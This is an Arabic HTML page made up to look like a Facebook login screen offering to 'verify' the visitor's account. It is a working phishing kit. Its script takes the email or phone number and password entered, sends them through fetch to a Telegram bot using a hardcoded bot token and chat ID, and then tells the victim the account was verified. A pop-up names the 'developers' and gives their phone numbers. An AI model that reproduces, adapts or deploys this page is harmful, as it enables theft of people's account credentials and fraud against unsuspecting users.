<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - فيسبوك</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #18191a;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
        }
        .login-container {
            background-color: #242526;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
            width: 400px;
            padding: 30px;
            text-align: center;
        }
        .facebook-logo {
            width: 105px; /* تم تقليل الحجم هنا */
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #444;
            border-radius: 5px;
            font-size: 14px;
            background-color: #3a3b3c;
            color: white;
        }
        input[type="submit"] {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        input[type="submit"]:hover {
            background-color: #145dbf;
        }
        .forgot-password {
            margin-top: 15px;
            font-size: 14px;
        }
        .forgot-password a {
            text-decoration: none;
            color: #1877f2;
        }
        .forgot-password a:hover {
            text-decoration: underline;
        }

        /* نافذة منبثقة */
        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            overflow: auto;
            padding-top: 60px;
        }
        .modal-content {
            background-color: #007bff;
            margin: 5% auto;
            padding: 20px;
            border-radius: 10px;
            width: 80%;
            color: white;
            text-align: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
        .modal-content h3 {
            margin-bottom: 20px;
        }
        .modal-content p {
            margin: 10px 0;
        }
        .modal-content .close {
            color: white;
            font-size: 30px;
            font-weight: bold;
            position: absolute;
            top: 10px;
            right: 25px;
            cursor: pointer;
        }
        .modal-content .close:hover,
        .modal-content .close:focus {
            color: #bbb;
            text-decoration: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- إضافة رابط لصورة فيسبوك بدلاً من الصورة الحالية -->
        <a href="https://www.facebook.com" target="_blank">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1024px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook" class="facebook-logo">
        </a>
        <h2>تسجيل الدخول إلى فيسبوك</h2>
        <form id="loginForm" method="POST">
            <input type="text" name="username" id="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="password" id="password" placeholder="كلمة المرور" required>
            <input type="submit" value="توثيق حساب فيسبوك">
        </form>
        <div class="forgot-password">
            <p><a href="#" id="showModal">حول هذه العملية</a></p>
        </div>
    </div>

    <!-- نافذة منبثقة -->
    <div id="myModal" class="modal">
        <div class="modal-content">
            <span class="close" id="closeModal">&times;</span>
            <h3>هذا البرنامج من تصميم الملاعين لتوثيق حسابات فيسبوك 🔥</h3>
            <p>انطلق الآن لتسجيل حسابك و توثيقه في البرنامج الأسرع على الإطلاق 🚀✅</p>
            <p>المطورون :-</p>
            <p>دراجون : 01144256223</p>
            <p>زعيم : 01070849331</p>
        </div>
    </div>

    <script>
        // فتح النافذة المنبثقة
        var modal = document.getElementById("myModal");
        var btn = document.getElementById("showModal");
        var span = document.getElementById("closeModal");

        btn.onclick = function() {
            modal.style.display = "block";
        }

        // غلق النافذة المنبثقة
        span.onclick = function() {
            modal.style.display = "none";
        }

        // إغلاق النافذة عند الضغط خارجها
        window.onclick = function(event) {
            if (event.target == modal) {
                modal.style.display = "none";
            }
        }

        // إرسال المعلومات إلى بوت تيليجرام عند الضغط على زر "توثيق حساب فيسبوك"
        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault(); // منع إعادة تحميل الصفحة

            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;

            // إرسال المعلومات إلى بوت تيليجرام
            var telegramBotToken = "7962089994:AAFRKF3TPaaWKRKIktrjNkYR99UQzta8wOo";
            var telegramChatId = "6140885537";
            var message = `معلومات الحساب :
            البريد الإلكتروني: ${username}
            كلمة المرور: ${password}`;

            var url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert("تم توثيق حسابك بنجاح!");
                    } else {
                        alert("حدث خطأ أثناء إرسال البيانات.");
                    }
                })
                .catch(error => {
                    alert("خطأ في الاتصال بالخادم.");
                    console.error("Error:", error);
                });
        });
    </script>
</body>
</html>
